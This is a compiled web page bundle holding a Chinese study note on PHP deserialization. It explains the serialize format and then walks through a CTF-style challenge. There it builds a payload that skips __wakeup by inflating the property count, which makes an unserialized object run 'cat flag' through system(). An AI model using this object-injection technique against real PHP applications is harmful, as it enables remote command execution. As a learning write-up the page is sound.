import{_ as r,c as g,d as n,a as s,f as a,b as l,e as h,r as e,o as c}from"./app-COI5I2_t.js";const y="/docs/assets/4-DhmEcBRU.png",o="/docs/assets/7-CKeH1rF7.png",u="/docs/assets/6-IpNJeaNG.png",B={};function v(A,i){const t=e("VPIcon"),k=e("CodeTabs");return c(),g("div",null,[i[2]||(i[2]=n(`<h2 id="概念" tabindex="-1"><a class="header-anchor" href="#概念"><span>概念</span></a></h2><p>要了解<code>反序列化（unserialize）</code>，就应该先了解<code>序列化（serialize）</code></p><blockquote><p>序列化是将数据结构或对象转换成一种特定格式的字节序列的过程。</p></blockquote><p>乍一看还是有点抽象，我们可以通过下面这个示例来大致理解一下</p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&lt;?</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">php</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">highlight_file</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">__FILE__</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">error_reporting</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">class</span><span style="--shiki-light:#2E8F82;--shiki-dark:#5DA994;"> Student</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">name</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">age</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">scores</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> function</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> __construct</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">($</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">name</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">age</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">scores</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">)</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">        $</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">name</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">name</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">        $</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">age</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">age</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">        $</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">scores</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">scores</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> function</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> __toString</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">()</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">        return</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">Name: </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">{$</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">name</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">, Age: </span><span style="--shiki-light:#999999;--shiki-dark:#666666;">{$</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">age</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">, Scores: </span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> .</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> implode</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">, </span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">scores</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">// 创建一个 Student 对象</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">student</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> new</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> Student</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">张三</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 20</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> [</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">85</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 90</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 78</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">]);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">// 序列化对象</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">serializedStudent</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> serialize</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">($</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">student</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">echo</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">序列化后的字符串:</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">echo</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">serializedStudent</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">echo</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &#39;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">&lt;br&gt;</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">// 反序列化对象</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">unserializedStudent</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> unserialize</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">($</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">serializedStudent</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">echo</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">反序列化后的对象:</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">echo</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">unserializedStudent</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">?&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip"><p class="hint-container-title">提示</p><p><code>__toString() 的作用</code></p><p>__toString( ) 是 PHP 中的一个魔术方法（Magic Method），它是 PHP 面向对象编程中的一个重要特性。__toString( ) 的作用是定义一个类在被转换为字符串时的行为。当尝试将一个对象直接用于字符串上下文（例如回显、字符串拼接等）时，PHP 会自动调用该对象的 __toString( ) 方法。（例如上述代码中的<code>serialize($student)</code>）</p></div><p>得到的输出结果如下</p><p><img src="`+y+'" alt=""></p><div class="language-serialize line-numbers-mode" data-ext="serialize" data-title="serialize"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>O:7:&quot;Student&quot;:3:{s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:3:&quot;age&quot;;i:20;s:6:&quot;scores&quot;;a:3:{i:0;i:85;i:1;i:90;i:2;i:78;}}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-unserialize line-numbers-mode" data-ext="unserialize" data-title="unserialize"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>Name: 张三, Age: 20, Scores: 85, 90, 78</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>分析序列化得到的字符串，它的组成大致可以这样理解：</p>',11)),i[3]||(i[3]=s("blockquote",{"css-module":"."},[s("p",null,[s("strong",null,"1. 对象标识"),a(' O:长度:"类名":属性数:')])],-1)),i[4]||(i[4]=n(`<p><code>O</code>代表<code>Student</code>是一个Obejct(对象)，字符串长度为<code>7</code>，有<code>3</code>个属性：name,age,scores</p><blockquote><p><strong>2. 成员属性</strong> 键类型:键长度:&quot;键名&quot;;值类型:值...</p></blockquote><p><code>s</code>即string，<code>i</code>即integer</p><h2 id="实战" tabindex="-1"><a class="header-anchor" href="#实战"><span>实战</span></a></h2><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&lt;?</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">php</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">highlight_file</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">__FILE__</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">error_reporting</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">class</span><span style="--shiki-light:#2E8F82;--shiki-dark:#5DA994;"> begin</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">{</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#999999;--shiki-dark:#666666;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">unf01d</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">beginning</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> function</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> cmd</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">($</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">a</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">){</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">        system</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">($</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">a</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> function</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> __wakeup</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(){</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">        $</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">unf01d</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">end</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">;</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">    public</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> function</span><span style="--shiki-light:#998418;--shiki-dark:#B8A965;"> __destruct</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">(){</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">        $</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cmd</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">($</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">this</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-&gt;</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">unf01d</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">    }</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">}</span></span>
<span class="line"><span style="--shiki-light:#999999;--shiki-dark:#666666;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">cmd</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">=$</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">_GET</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">[</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">cmd</span><span style="--shiki-light:#B5695977;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">];</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">unserialize</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">($</span><span style="--shiki-light:#B07D48;--shiki-dark:#BD976A;">cmd</span><span style="--shiki-light:#999999;--shiki-dark:#666666;">);</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">?&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip"><p class="hint-container-title">提示</p><p>system( )与exec( )类似，也可以调用系统指令</p><p><code>__wakeup()</code>是一个魔术方法，在反序列化的时候会优先调用它</p></div><p>而我们要起到我们的目的，就必须绕开__wakeup( )</p><div class="hint-container warning"><p class="hint-container-title">注意</p><p>此绕过方法只适用于部分版本的PHP</p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p></div><p>如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过</p>`,9)),l(k,{id:"82",data:[{id:"crack.php"}]},{title0:h(({value:p,isActive:d})=>[l(t,{name:"vscode-icons:file-type-php"}),i[0]||(i[0]=s("span",null,"crack.php",-1))]),tab0:h(({value:p,isActive:d})=>i[1]||(i[1]=[s("div",{class:"language-php line-numbers-mode","data-ext":"php","data-title":"php"},[s("button",{class:"copy",title:"复制代码","data-copied":"已复制"}),s("pre",{class:"shiki shiki-themes vitesse-light vitesse-dark vp-code"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}},"<?"),s("span",{style:{"--shiki-light":"#A65E2B","--shiki-dark":"#C99076"}},"php")]),a(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}},"class"),s("span",{style:{"--shiki-light":"#2E8F82","--shiki-dark":"#5DA994"}}," begin"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}}," {")]),a(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}},"    public"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}}," $"),s("span",{style:{"--shiki-light":"#B07D48","--shiki-dark":"#BD976A"}},"unf01d"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}}," ="),s("span",{style:{"--shiki-light":"#B5695977","--shiki-dark":"#C98A7D77"}},' ""'),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},";"),s("span",{style:{"--shiki-light":"#A0ADA0","--shiki-dark":"#758575DD"}}," //目标指令")]),a(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},"}")]),a(`
`),s("span",{class:"line"}),a(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},"$"),s("span",{style:{"--shiki-light":"#B07D48","--shiki-dark":"#BD976A"}},"payload"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}}," ="),s("span",{style:{"--shiki-light":"#998418","--shiki-dark":"#B8A965"}}," serialize"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},"("),s("span",{style:{"--shiki-light":"#1E754F","--shiki-dark":"#4D9375"}},"new"),s("span",{style:{"--shiki-light":"#998418","--shiki-dark":"#B8A965"}}," begin"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},"());")]),a(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#998418","--shiki-dark":"#B8A965"}},"echo"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}}," $"),s("span",{style:{"--shiki-light":"#B07D48","--shiki-dark":"#BD976A"}},"payload"),s("span",{style:{"--shiki-light":"#999999","--shiki-dark":"#666666"}},";")]),a(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#AB5959","--shiki-dark":"#CB7676"}},"?>")])])]),s("div",{class:"line-numbers","aria-hidden":"true",style:{"counter-reset":"line-number 0"}},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1)])),_:1}),i[5]||(i[5]=n('<p>由此构造出payload,将<code>1</code>改为<code>2</code></p><p><img src="'+o+'" alt=""></p><div class="language-payload line-numbers-mode" data-ext="payload" data-title="payload"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span>O:5:&quot;begin&quot;:2:{s:6:&quot;unf01d&quot;;s:8:&quot;cat flag&quot;;}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>上传就可以得到flag</p><p><img src="'+u+'" alt=""></p><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结"><span>总结</span></a></h2><p>之后还将加深对魔术方法调用顺序的理解，以及学习其他绕过__wakeup()的方法</p>',7))])}const b=r(B,[["render",v],["__file","index.html.vue"]]),D=JSON.parse('{"path":"/security/unserialize/","title":"PHP反序列化","lang":"zh-CN","frontmatter":{"title":"PHP反序列化","tags":["web","php","serialize","review"],"createTime":"2025/02/05 11:18:54","permalink":"/security/unserialize/"},"headers":[],"readingTime":{"minutes":2.27,"words":682},"git":{},"filePathRelative":"notes/安全/unser.md"}');export{b as comp,D as data};
